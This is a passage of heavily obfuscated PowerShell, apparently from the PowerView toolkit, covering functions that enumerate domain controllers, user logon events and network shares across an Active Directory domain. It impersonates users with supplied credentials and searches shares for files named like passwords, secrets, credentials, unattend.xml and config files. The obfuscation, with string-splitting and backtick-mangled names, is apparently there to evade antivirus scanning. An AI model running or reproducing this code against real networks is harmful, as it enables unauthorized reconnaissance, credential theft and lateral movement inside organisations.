        if (${PsBO`Un`dPARa`Me`T`Ers}[("{0}{1}"-f'S','erver')]) { ${usER`SE`ARc`HeRAR`GUM`E`NtS}[("{0}{1}" -f'Serve','r')] = ${s`ER`VEr} }
        if (${Psb`OuN`DPaRam`etE`RS}[("{0}{2}{1}" -f 'Se','Scope','arch')]) { ${users`eA`RC`HERArGumeN`Ts}[("{2}{0}{1}"-f 'h','Scope','Searc')] = ${seaR`cHs`CO`pe} }
        if (${P`S`BoUN`DPar`AMeTeRs}[("{1}{2}{0}" -f'eSize','ResultP','ag')]) { ${USE`R`sEarcHE`RA`RgUmEN`TS}[("{0}{2}{1}{3}"-f'ResultP','eSi','ag','ze')] = ${RE`sU`l`TPAG`eSizE} }
        if (${PSb`OUnDPa`R`A`mEteRS}[("{0}{2}{3}{1}{4}"-f'S','L','erve','rTime','imit')]) { ${uS`E`R`s`earchE`R`ArguMenTS}[("{1}{4}{3}{0}{2}" -f'eL','Se','imit','m','rverTi')] = ${serV`eRt`IMeL`IMIT} }
        if (${pS`BouN`DparA`Met`ERS}[("{1}{0}" -f 'tone','Tombs')]) { ${USEr`S`eARCheRA`R`G`U`Ments}[("{0}{1}{2}" -f 'Tombsto','n','e')] = ${TOmb`Sto`NE} }
        if (${P`s`B`oUnDParAMe`T`erS}[("{1}{2}{0}" -f'tial','Cre','den')]) { ${Usersear`CHER`A`RG`Ume`NtS}[("{1}{2}{0}"-f 'ial','C','redent')] = ${c`REd`eN`TiaL} }

        if (${P`sBoun`dp`ArAmEte`RS}[("{1}{2}{0}" -f'y','User','Identit')] -or ${pSbOu`ND`p`A`RAmE`Ters}[("{4}{3}{1}{2}{0}"-f 'r','LDAPF','ilte','ser','U')] -or ${psbo`UnDP`A`RAm`ETErS}[("{0}{1}{2}{3}"-f 'Use','rS','earchBa','se')] -or ${PS`B`OuNDPar`AMET`e`Rs}[("{2}{3}{1}{0}"-f 't','oun','User','AdminC')]) {
            ${TArgETU`s`ERs} = &("{0}{2}{1}{3}"-f'Get-Dom','Use','ain','r') @UserSearcherArguments | &("{1}{2}{0}{3}"-f 'c','Select-O','bje','t') -ExpandProperty ("{1}{2}{0}{3}" -f'ccount','sam','a','name')
        }
        elseif (${P`sBOu`NdPA`RAMeters}[("{1}{0}{2}{3}" -f'erGroupI','Us','dent','ity')] -or (-not ${PsBO`UNdP`ArAmeT`erS}[("{0}{1}"-f 'Filte','r')])) {
            
            ${G`RoupSE`Arch`era`RguMENTs} = @{
                ("{0}{1}{2}"-f 'I','den','tity') = ${uSeRGR`OUPID`e`NtiTY}
                ("{2}{0}{1}"-f'r','se','Recu') = ${T`RUe}
            }
            &("{1}{2}{3}{0}"-f'rbose','Write','-','Ve') ('UserGr'+'ou'+'p'+'Identity'+': '+"$UserGroupIdentity")
            if (${p`SBOu`NDPaR`AMETE`RS}[("{0}{1}{2}{3}" -f 'User','D','oma','in')]) { ${gr`O`UPsea`RCH`ErarGUmEN`Ts}[("{1}{0}" -f'ain','Dom')] = ${USE`R`DOmaiN} }
            if (${PsB`Ou`ND`PaRAmEtE`RS}[("{0}{2}{3}{1}"-f'Use','e','rSearc','hBas')]) { ${GRo`U`pSeA`RC`h`ERArgUmE`NtS}[("{2}{0}{1}{3}" -f'a','rchBas','Se','e')] = ${uS`erseaR`Ch`Base} }
            if (${pS`BOU`ND`PARa`mEt`eRS}[("{0}{1}" -f 'Serv','er')]) { ${GR`OuPsEarc`Hera`Rgum`eN`Ts}[("{0}{1}" -f'Serve','r')] = ${S`erVER} }
            if (${P`sboUn`D`PaRa`Met`Ers}[("{0}{1}{2}" -f'S','earchSco','pe')]) { ${GROup`SeAr`che`R`ArgUME`N`TS}[("{2}{0}{1}" -f'earchS','cope','S')] = ${S`eArcH`sCOpE} }
            if (${pSbO`UN`dpaRametE`Rs}[("{1}{0}{4}{3}{2}" -f 'ultPa','Res','Size','e','g')]) { ${grOuPSEarCH`eRAR`G`UMENtS}[("{3}{1}{2}{4}{0}" -f 'ze','l','tPageS','Resu','i')] = ${Re`sUlTp`AgE`Si`Ze} }
            if (${P`s`B`OUndpa`RamEt`erS}[("{0}{4}{1}{3}{2}" -f'S','v','it','erTimeLim','er')]) { ${gROUPSE`A`RchEr`AR`gumeNTs}[("{3}{0}{1}{2}"-f 'v','e','rTimeLimit','Ser')] = ${SeRvEr`Tim`EL`imIt} }
            if (${p`sb`oU`NDParAM`EtErS}[("{1}{0}"-f'ne','Tombsto')]) { ${GROUpSe`ARcH`ERA`R`GUm`eN`Ts}[("{0}{1}{2}"-f'Tom','bsto','ne')] = ${T`oMBSTO`NE} }
            if (${pSboUn`DP`ArAme`TERS}[("{1}{0}{2}" -f'de','Cre','ntial')]) { ${GRO`Ups`E`A`RCHeRaR`GumenTS}[("{0}{2}{1}" -f 'Cre','l','dentia')] = ${cR`ED`ENT`Ial} }
            ${targET`Us`ErS} = &("{2}{0}{1}{3}"-f 't','-Do','Ge','mainGroupMember') @GroupSearcherArguments | &("{2}{1}{0}"-f'ject','Ob','Select-') -ExpandProperty ("{2}{0}{1}" -f 'mber','Name','Me')
        }

        
        if (${pS`BOUndp`AR`A`meteRS}[("{1}{2}{3}{0}" -f'e','Computer','N','am')]) {
            ${T`A`Rg`ETCOm`pUtErs} = ${C`oMpUtE`RnaMe}
        }
        else {
            
            ${dcSeaR`ch`eRA`RgUMENtS} = @{
                ("{0}{1}"-f 'LDA','P') = ${t`Rue}
            }
            if (${pSBoUn`dparam`E`TERs}[("{1}{0}"-f 'ain','Dom')]) { ${DcSEarC`HerARgU`MEN`Ts}[("{1}{0}"-f'in','Doma')] = ${d`OmAin} }
            if (${PSb`ound`PAraMETe`RS}[("{0}{2}{1}"-f 'S','ver','er')]) { ${D`CS`EaRCH`EraR`GuM`enTS}[("{1}{0}{2}"-f'erve','S','r')] = ${sERv`Er} }
            if (${PsBoun`D`p`ARamE`TeRs}[("{2}{0}{1}"-f 'ia','l','Credent')]) { ${D`cSE`ARchERARg`UMEn`TS}[("{1}{0}{2}" -f 'tia','Creden','l')] = ${cred`eNT`i`AL} }
            &("{0}{1}{3}{2}"-f 'W','r','Verbose','ite-') ('[Find-Domain'+'U'+'s'+'e'+'r'+'Event]'+' '+'Que'+'rying '+'fo'+'r '+'dom'+'ai'+'n '+'con'+'trol'+'l'+'ers '+'i'+'n '+'dom'+'ai'+'n: '+"$Domain")
            ${t`ArG`etc`OMPUt`erS} = &("{4}{3}{0}{1}{5}{2}"-f'-DomainCo','nt','ller','t','Ge','ro') @DCSearcherArguments | &("{4}{0}{1}{3}{2}"-f'el','ect','t','-Objec','S') -ExpandProperty ("{0}{2}{1}"-f 'dns','e','hostnam')
        }
        if (${T`A`RGE`T`CO`MPuTErS} -and (${t`AR`GETCOM`PuTe`RS} -isnot [System.Array])) {
            ${tA`R`GeTcO`MpuTeRS} = @(,${Ta`RGe`T`cOmP`UTers})
        }
        &("{1}{3}{0}{2}" -f 'bo','Wr','se','ite-Ver') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{2}{0}{1}{3}" -f'te-','Ver','Wri','bose') ('[Fin'+'d'+'-Dom'+'ain'+'UserEv'+'en'+'t] '+'T'+'arg'+'etC'+'ompute'+'rs '+"$TargetComputers")
        if (${taRg`E`TcOMpUt`e`Rs}."l`EnG`TH" -eq 0) {
            throw ("{5}{0}{4}{8}{2}{6}{7}{1}{3}"-f 'd','nu',' No','merate','-D','[Fin',' hosts fou','nd to e','omainUserEvent]')
        }

        
        ${H`o`stENumbloCk} = {
            Param(${Co`Mp`UT`ERN`Ame}, ${s`T`Ar`TtIme}, ${End`Ti`Me}, ${maX`EVe`NTS}, ${tAr`gE`TUSE`RS}, ${fIlt`Er}, ${crE`DE`NTiAL})

            ForEach (${tarG`e`T`cOMPUtEr} in ${comPUTE`RNa`ME}) {
                ${u`p} = &("{3}{2}{0}{4}{1}"-f 'onn','ction','est-C','T','e') -Count 1 -Quiet -ComputerName ${T`ArG`Et`ComPut`Er}
                if (${up}) {
                    ${D`o`Main`US`erEVEnTa`Rgs} = @{
                        ("{2}{1}{0}{3}" -f'r','pute','Com','Name') = ${TargetcoMP`U`Ter}
                    }
                    if (${S`TarTT`Ime}) { ${DoMaIn`USer`eVEnt`AR`Gs}[("{2}{1}{0}"-f 'rtTime','ta','S')] = ${S`TaR`Ttime} }
                    if (${en`d`TiMe}) { ${DOmaInu`s`EREV`en`TAR`GS}[("{0}{2}{1}"-f 'En','e','dTim')] = ${End`T`IMe} }
                    if (${MaX`eVEn`TS}) { ${d`oma`Inu`s`ereve`NtaRgs}[("{0}{1}"-f 'Ma','xEvents')] = ${m`AxEVe`Nts} }
                    if (${CRe`DenT`I`Al}) { ${d`Om`Ai`NusErev`eN`TARGs}[("{1}{0}{2}" -f'nti','Crede','al')] = ${c`REd`en`TiAL} }
                    if (${FI`L`TER} -or ${Tar`gETUS`ERs}) {
                        if (${TAr`get`US`eRs}) {
                            &("{3}{6}{1}{5}{2}{4}{0}" -f 't','s','e','Get-Doma','n','erEv','inU') @DomainUserEventArgs | &("{0}{2}{1}"-f 'Whe','t','re-Objec') {${t`ArGetU`se`Rs} -contains ${_}."TaR`gETUs`e`RName"}
                        }
                        else {
                            ${o`peR`AtoR} = 'or'
                            ${fi`lt`eR}."ke`ys" | &("{1}{3}{2}{0}{4}"-f'jec','ForEach','Ob','-','t') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{1}{0}{2}"-f'per','O','ator')) -or (${_} -eq ("{1}{0}{2}"-f 'ratio','Ope','n'))) {
                                    if ((${fi`LT`er}[${_}] -match '&') -or (${fIl`TeR}[${_}] -eq 'and')) {
                                        ${o`pe`RAtor} = 'and'
                                    }
                                }
                            }
                            ${Ke`Ys} = ${fIl`T`ER}."ke`yS" | &("{1}{3}{2}{0}"-f'ct','Where-','e','Obj') {(${_} -ne 'Op') -and (${_} -ne ("{0}{1}"-f 'Op','erator')) -and (${_} -ne ("{1}{2}{0}" -f'on','Oper','ati'))}
                            &("{2}{1}{4}{0}{3}" -f 'n','main','Get-Do','t','UserEve') @DomainUserEventArgs | &("{2}{1}{4}{3}{0}"-f'ct','r','Fo','e','Each-Obj') {
                                if (${OPeR`A`TOR} -eq 'or') {
                                    ForEach (${K`EY} in ${ke`YS}) {
                                        if (${_}."$Key" -match ${Fi`lter}[${K`Ey}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${K`Ey} in ${K`eyS}) {
                                        if (${_}."$Key" -notmatch ${FI`lTer}[${K`eY}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{0}{3}{2}{1}{4}"-f'Get-Doma','serE','U','in','vent') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${P`sBOU`Nd`PaRaMETers}[("{1}{0}" -f 'elay','D')] -or ${PS`BOUnDpAR`Am`etERs}[("{1}{2}{0}" -f 'OnSuccess','St','op')]) {

            &("{2}{0}{1}" -f 'Ve','rbose','Write-') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}{3}" -f'rite-','W','Verbos','e') ('[Fi'+'nd-Dom'+'ainUserE'+'ven'+'t'+'] '+'De'+'lay: '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${C`Oun`Ter} = 0
            ${RAn`d`NO} = &("{2}{0}{1}"-f'w-Objec','t','Ne') ("{1}{2}{0}{3}" -f 'em.Ra','Sy','st','ndom')

            ForEach (${targ`et`cO`M`pUTEr} in ${ta`RgE`TCoM`pUteRS}) {
                ${C`OUnT`Er} = ${Co`U`Nter} + 1

                
                &("{3}{1}{2}{0}" -f'p','tar','t-Slee','S') -Seconds ${rAnd`NO}.("{1}{0}" -f't','Nex').Invoke((1-${jIt`T`er})*${DEl`Ay}, (1+${J`iTT`eR})*${DE`LaY})

                &("{0}{2}{3}{4}{1}" -f 'W','e','rite-Ve','rb','os') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${Re`sUlT} = &("{1}{2}{0}"-f 'mand','Invoke-Co','m') -ScriptBlock ${H`oStE`N`UMBlock} -ArgumentList ${taRg`e`TcOmPut`Er}, ${StA`Rtt`iMe}, ${eNdt`IMe}, ${MA`XE`VeN`Ts}, ${tArgEtu`SE`Rs}, ${fIl`T`ER}, ${cREd`ENTi`AL}
                ${Re`SULt}

                if (${r`EsU`LT} -and ${STo`PON`sUcCESs}) {
                    &("{0}{2}{1}"-f'W','Verbose','rite-') ("{5}{11}{10}{2}{4}{0}{9}{13}{1}{7}{6}{14}{8}{12}{3}"-f'Tar','t us','inUserE',' early','vent] ','[Fi','nd, r','er fou','turn','g','ma','nd-Do','ing','e','e')
                    return
                }
            }
        }
        else {
            &("{2}{3}{1}{4}{0}" -f 'ose','e','Write','-V','rb') ('[Find'+'-'+'Do'+'mainUse'+'rEvent] '+'Usi'+'ng '+'thr'+'eadi'+'n'+'g '+'w'+'ith '+'thre'+'ads:'+' '+"$Threads")

            
            ${sc`RiPt`pa`R`AMs} = @{
                ("{2}{1}{0}" -f'tTime','r','Sta') = ${S`T`ARTTImE}
                ("{1}{0}"-f 'ime','EndT') = ${e`N`DtiME}
                ("{1}{0}"-f'axEvents','M') = ${M`AxEVeN`Ts}
                ("{1}{3}{0}{2}" -f 'getUse','T','rs','ar') = ${t`ARgE`TuSeRS}
                ("{0}{2}{1}"-f 'F','lter','i') = ${filT`ER}
                ("{1}{2}{0}"-f'tial','Cred','en') = ${C`R`EDentiAl}
            }

            
            &("{1}{6}{2}{0}{5}{4}{3}" -f'd','Ne','e','tion','c','Fun','w-Thread') -ComputerName ${t`ArgeTCOm`p`U`TERS} -ScriptBlock ${HOs`T`ENumblO`cK} -ScriptParameters ${sCrIp`TP`AR`AmS} -Threads ${t`h`READs}
        }
    }
}


function Find-`dOMaI`NSHarE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}{4}" -f 's','PSSho','dProce','ul','s'}, '')]
    [OutputType({"{5}{4}{1}{2}{0}{3}"-f'har','r','View.S','eInfo','e','Pow'})]
    Param(
        [Parameter(poSITIon = 0, vaLUEFRoMpIPELinE = ${tR`Ue}, ValueFRompiPELIneBYPrOPeRtYNAmE = ${T`RuE})]
        [Alias({"{2}{3}{1}{0}"-f 'e','tNam','D','NSHos'})]
        [String[]]
        ${CO`MPUtErN`A`Me},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'omain','D'})]
        [String]
        ${C`OM`PutEr`d`OMaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMpUt`ErLd`A`pfilt`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coM`Pu`T`E`RseARChBA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{4}{2}{0}" -f'm','Operatin','yste','g','S'})]
        [String]
        ${c`OMPUT`Er`OperAtiNG`SysTEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'Pack','vice','Ser'})]
        [String]
        ${COM`PUTerSErVI`CEP`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'SiteNa','me'})]
        [String]
        ${cO`M`PUtErsiT`ENAMe},

        [Alias({"{1}{2}{0}"-f 'ccess','Check','A'})]
        [Switch]
        ${chEcksHAR`EAc`c`E`SS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{4}{2}"-f 'Con','Domain','er','trol','l'})]
        [String]
        ${s`E`RVEr},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}{2}"-f'ev','OneL','el'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${seaR`chS`C`OPe} = ("{2}{1}{0}"-f 'btree','u','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sultp`AGe`sI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErVerti`mEL`IMIt},

        [Switch]
        ${toMbST`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdEN`TiAl} =  ${7T`Q02}::"eMp`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`lay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JIT`T`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${TH`R`EAdS} = 20
    )

    BEGIN {

        ${COMPuTeRSeaRC`He`R`Argu`menTs} = @{
            ("{1}{2}{0}"-f'ies','Proper','t') = ("{1}{2}{0}"-f'e','dns','hostnam')
        }
        if (${p`SboUnDpAR`AmET`ERS}[("{0}{1}{2}"-f 'ComputerDom','ai','n')]) { ${COm`pUtERSEARch`Er`A`RGuMeNtS}[("{1}{0}"-f'main','Do')] = ${c`O`MPUTeR`D`oMaiN} }
        if (${PSB`OuNDp`Ar`AMETErs}[("{2}{5}{4}{0}{3}{1}"-f 'rLDAPF','r','C','ilte','ute','omp')]) { ${cOmPuteRSEAR`c`HeRArGUm`e`N`TS}[("{2}{1}{0}" -f 'er','APFilt','LD')] = ${c`O`Mp`UTe`RLDAPFIltEr} }
        if (${psBOUN`D`pArAm`ETErS}[("{0}{2}{4}{3}{1}"-f 'Com','e','puterS','chBas','ear')]) { ${Co`mPuteRs`e`Ar`C`h`e`RaRGUmeNtS}[("{0}{1}{3}{2}"-f 'Se','a','hBase','rc')] = ${coMP`UT`ersearChBa`Se} }
        if (${p`S`BOUNdParAm`ETErs}[("{1}{3}{0}{2}" -f 'raine','Uncons','d','t')]) { ${com`pU`TERSeArC`he`RarGU`mENtS}[("{2}{4}{3}{1}{0}"-f 'ained','r','U','const','n')] = ${UncOnS`T`R`Ai`NeD} }
        if (${psbouN`DpA`Ra`MEte`RS}[("{3}{4}{0}{1}{2}"-f'O','peratingSy','stem','Compute','r')]) { ${cOM`pUTErSeA`RCH`eR`Ar`GumeNTs}[("{3}{1}{0}{2}" -f'gSyst','peratin','em','O')] = ${Op`E`RAti`NG`SYSTEm} }
        if (${P`sboun`DparAME`TERs}[("{0}{1}{2}{3}{4}" -f'Compu','terS','e','rvice','Pack')]) { ${cOMput`eRSeAR`C`hErArGU`mE`Nts}[("{0}{2}{3}{1}"-f 'S','Pack','ervi','ce')] = ${SER`V`icEpacK} }
        if (${pSBoU`NDpaRAm`et`ERs}[("{0}{2}{4}{1}{3}" -f'Co','iteNa','mp','me','uterS')]) { ${Co`mpUT`eRs`e`ArcHe`RaRGUMeN`Ts}[("{2}{1}{0}" -f 'me','teNa','Si')] = ${SIt`enA`mE} }
        if (${PsB`o`UndPaR`A`metERS}[("{0}{2}{1}" -f 'Ser','er','v')]) { ${cO`m`pUterSeAr`CHERAr`GUm`E`N`TS}[("{0}{1}{2}"-f 'Se','rve','r')] = ${sERV`er} }
        if (${p`sbOu`NDparAMET`ERs}[("{1}{2}{0}" -f'chScope','Sea','r')]) { ${C`oMP`U`TErse`ArC`hERarGUmE`NTS}[("{2}{3}{0}{1}"-f 'op','e','S','earchSc')] = ${sEAr`CHs`CO`Pe} }
        if (${P`sbouNd`P`ARa`MeteRs}[("{1}{2}{0}{4}{3}" -f'su','R','e','Size','ltPage')]) { ${COMPuT`eR`s`EARCH`ERARguMenTS}[("{2}{1}{0}{4}{3}" -f'S','sultPage','Re','ze','i')] = ${REsu`l`T`paGEsIZE} }
        if (${PSBoU`NDPa`RAmEt`e`Rs}[("{2}{3}{0}{1}"-f'Tim','eLimit','S','erver')]) { ${cOmpUTeR`S`E`A`R`cHE`R`ARgUmEnts}[("{3}{2}{0}{1}" -f'Li','mit','Time','Server')] = ${Se`Rve`RTIMELIM`iT} }
        if (${PSbO`UNDP`Ar`A`mETErS}[("{1}{0}" -f'one','Tombst')]) { ${COmPuTe`RS`eaRCHE`R`ARgUMe`NTs}[("{3}{2}{0}{1}"-f'm','bstone','o','T')] = ${T`OMb`stOnE} }
        if (${P`sbOUNd`PARA`MeTERs}[("{1}{0}{2}" -f 'dentia','Cre','l')]) { ${COMpUt`E`RSearcheRArG`U`MeN`TS}[("{3}{1}{2}{0}"-f'al','redent','i','C')] = ${CR`Ede`Ntial} }

        if (${P`sB`oUnDpARaME`TERs}[("{3}{2}{1}{0}" -f 'ame','erN','omput','C')]) {
            ${TARg`EtcO`mPu`TerS} = ${cOmpuTEr`NA`Me}
        }
        else {
            &("{3}{2}{1}{0}"-f 'erbose','V','te-','Wri') ("{12}{6}{5}{2}{4}{3}{11}{10}{0}{1}{7}{8}{9}"-f 'r','s i','omain','are] Querying co','Sh','d-D','in','n the do','ma','in','ute','mp','[F')
            ${targe`TcompUT`E`RS} = &("{0}{4}{5}{2}{1}{3}" -f 'Ge','ut','mainComp','er','t-D','o') @ComputerSearcherArguments | &("{2}{0}{1}" -f '-Obje','ct','Select') -ExpandProperty ("{0}{2}{1}{3}" -f'dns','ostnam','h','e')
        }
        &("{3}{0}{1}{2}"-f 'V','erbo','se','Write-') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${TArg`ET`comp`UTE`Rs}."lEN`GtH" -eq 0) {
            throw ("{5}{13}{9}{10}{8}{6}{3}{4}{7}{2}{12}{1}{11}{0}" -f'rate','u','to',' fo','u','[Find-',' No hosts','nd ','e]','om','ainShar','me',' en','D')
        }

        
        ${hOsTeNU`m`B`LO`cK} = {
            Param(${CO`mp`U`TerN`AmE}, ${chEckS`H`Ar`EAc`C`eSS}, ${T`oK`E`NhandLe})

            if (${TokEn`haN`dlE}) {
                
                ${nU`LL} = &("{3}{4}{1}{2}{5}{0}" -f'sonation','-Use','r','Invo','ke','Imper') -TokenHandle ${t`OKE`N`handlE} -Quiet
            }

            ForEach (${TA`RgET`cOmput`er} in ${ComP`UT`e`RName}) {
                ${u`p} = &("{2}{4}{0}{1}{3}"-f 'nn','ect','Te','ion','st-Co') -Count 1 -Quiet -ComputerName ${taR`gETcoM`pU`TeR}
                if (${U`p}) {
                    
                    ${S`haReS} = &("{1}{2}{0}" -f'hare','Get-Net','S') -ComputerName ${tAR`GE`TcOmp`UteR}
                    ForEach (${sh`ARE} in ${Sh`Ar`Es}) {
                        ${s`h`ArenAmE} = ${Sha`Re}."n`AME"
                        
                        ${p`ATh} = '\\'+${TA`RgEtc`O`mPuteR}+'\'+${S`h`A`REName}

                        if ((${s`HArE`NAMe}) -and (${s`HaReNa`mE}.("{0}{1}"-f 't','rim').Invoke() -ne '')) {
                            
                            if (${c`heCKShAr`Eac`cE`Ss}) {
                                
                                try {
                                    ${NU`LL} =  (  Get-VAriAblE ("reI"+"q"))."Va`lue"::("{0}{1}"-f'GetFi','les').Invoke(${P`AtH})
                                    ${s`H`Are}
                                }
                                catch {
                                    &("{2}{0}{3}{1}" -f'ite-Ve','e','Wr','rbos') ('Er'+'ror '+'a'+'ccess'+'ing '+'shar'+'e '+'pa'+'th '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${S`hA`Re}
                            }
                        }
                    }
                }
            }

            if (${tO`Kenh`AnD`Le}) {
                &("{1}{0}{4}{2}{3}"-f 't','Invoke-Rever','S','elf','To')
            }
        }

        ${LogON`T`OKeN} = ${n`ULL}
        if (${p`sBo`UnD`PARame`TeRS}[("{2}{0}{1}" -f 'edenti','al','Cr')]) {
            if (${psboUndPAr`A`me`TeRS}[("{1}{0}"-f 'lay','De')] -or ${psBoUNDp`A`RaM`etE`Rs}[("{0}{3}{2}{1}" -f'S','ccess','opOnSu','t')]) {
                ${LoGon`TOk`EN} = &("{3}{0}{5}{6}{4}{7}{2}{1}"-f 'oke-UserI','ion','onat','Inv','r','m','pe','s') -Credential ${c`REDeNTi`Al}
            }
            else {
                ${log`o`NTok`en} = &("{2}{0}{1}{4}{3}" -f'nvoke-Use','rImp','I','n','ersonatio') -Credential ${Cr`ede`NtI`Al} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`Sbo`UND`pArAmETeRs}[("{0}{1}" -f 'D','elay')] -or ${psB`ou`NdPa`Ra`m`EtErS}[("{0}{2}{1}" -f 'StopOnSu','s','cces')]) {

            &("{0}{2}{1}" -f'Wr','rbose','ite-Ve') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{0}" -f 'rbose','Wr','ite-Ve') ('['+'Find-'+'Dom'+'ain'+'Share]'+' '+'Del'+'ay: '+"$Delay, "+'Ji'+'tt'+'er: '+"$Jitter")
            ${co`UnT`Er} = 0
            ${raN`D`NO} = &("{2}{0}{3}{1}"-f 'ew-Ob','t','N','jec') ("{0}{1}{2}{3}{4}"-f'Syst','em','.R','ando','m')

            ForEach (${Ta`RgE`TCoMPu`TER} in ${taRgEtco`Mp`U`TE`RS}) {
                ${COUn`T`er} = ${cOU`NT`eR} + 1

                
                &("{2}{1}{0}"-f 'p','Slee','Start-') -Seconds ${ran`DNO}.("{0}{1}" -f'N','ext').Invoke((1-${jitT`er})*${de`Lay}, (1+${j`It`TeR})*${d`eLaY})

                &("{2}{3}{1}{0}" -f'rbose','e-Ve','Wri','t') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{2}{0}" -f 'mmand','Inv','oke-Co') -ScriptBlock ${hostenum`Blo`cK} -ArgumentList ${Ta`Rg`E`Tc`ompUTEr}, ${c`hECkSh`A`Re`AC`Cess}, ${LoG`ONTok`En}
            }
        }
        else {
            &("{2}{1}{0}" -f '-Verbose','ite','Wr') ('[Find'+'-D'+'oma'+'in'+'Share] '+'U'+'s'+'ing '+'th'+'readi'+'ng'+' '+'with'+' '+'th'+'reads: '+"$Threads")

            
            ${sCriptp`A`R`AMs} = @{
                ("{1}{0}{2}{3}{4}" -f 'heckSha','C','reA','cce','ss') = ${ChECKsh`AR`eacc`ESS}
                ("{0}{2}{1}{3}"-f 'To','d','kenHan','le') = ${l`O`GOn`TokEN}
            }

            
            &("{3}{2}{5}{0}{1}{4}" -f 'Func','tio','e','N','n','w-Threaded') -ComputerName ${tA`RGetco`MP`Ut`eRs} -ScriptBlock ${HO`StE`NUmB`LoCk} -ScriptParameters ${scR`IPt`PaRaMs} -Threads ${Th`R`EAds}
        }
    }

    END {
        if (${lo`Go`NT`OkeN}) {
            &("{2}{1}{3}{0}{4}"-f 'eve','n','I','voke-R','rtToSelf') -TokenHandle ${lOgOnTo`k`en}
        }
    }
}


function f`i`Nd-i`NtEREsTinGDoMaI`NsHaRe`FilE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}"-f 'ce','Pro','PSShould','ss'}, '')]
    [OutputType({"{4}{3}{2}{1}{0}" -f 'File','und','Fo','werView.','Po'})]
    [CmdletBinding(DefAulTpaRAmEtERSEtnamE = {"{3}{0}{2}{1}{4}"-f 'ci','icatio','f','FileSpe','n'})]
    Param(
        [Parameter(positiON = 0, ValueFRomPiPElInE = ${T`RUE}, valuefromPipELInEBYpRoPERTyNaME = ${t`RUE})]
        [Alias({"{1}{2}{3}{0}"-f'me','DN','SHostN','a'})]
        [String[]]
        ${C`omPut`ERnAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${com`P`U`TeR`doMAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`mp`U`TerLD`APfIL`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMPu`TERseArCHb`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{4}{3}{0}"-f 'm','ting','Opera','te','Sys'})]
        [String]
        ${c`o`mpUTE`RO`perATI`NGsysT`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Ser','vicePa','ck'})]
        [String]
        ${coM`PuTE`RSe`RvIcEpack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'eName','it','S'})]
        [String]
        ${cOMPUTER`sITE`Na`Me},

        [Parameter(PaRameTErSETNAMe = "fIleSP`ECi`Fic`A`T`ion")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Search','s','Term'}, {"{1}{0}" -f 'ms','Ter'})]
        [String[]]
        ${IN`c`luDE} = @(("{3}{1}{2}{0}"-f '*','asswo','rd','*p'), ("{0}{2}{1}" -f '*sen','*','sitive'), ("{1}{0}{2}" -f 'dm','*a','in*'), ("{1}{2}{0}"-f'ogin*','*','l'), ("{0}{1}{2}"-f'*secre','t','*'), ("{4}{3}{0}{2}{1}" -f'tend','xml','*.','nat','u'), ("{0}{2}{1}"-f'*.','mdk','v'), ("{2}{1}{0}" -f'*','ds','*cre'), ("{3}{1}{2}{0}"-f'l*','nt','ia','*crede'), ("{2}{1}{0}" -f 'fig','on','*.c')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{1}{3}{0}{2}" -f'QB','9','9QB','QB9QB9'))."rE`pla`ce"('9QB',[sTRiNg][cHaR]92)})]
        [Alias({"{0}{1}"-f 'Sh','are'})]
        [String[]]
        ${S`HA`RePA`Th},

        [String[]]
        ${eXClU`deds`H`AREs} = @('C$', (('Admin'+'{0}')  -F  [CHaR]36), (('Pr'+'intu3J')."ReP`lAce"(([chAR]117+[chAR]51+[chAR]74),'$')), (('IPC'+'Uuh')."rE`PLA`ce"(([chaR]85+[chaR]117+[chaR]104),'$'))),

        [Parameter(parAMEtersEtNAme = "f`iLE`speCIfica`T`iON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${la`S`TAcC`esst`Ime},

        [Parameter(paramETeRSeTnamE = "FI`lE`SPEciFiCA`Ti`ON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lAst`wRite`TImE},

        [Parameter(parameTeRsetNAmE = "FI`LESp`E`cIfIcati`oN")]
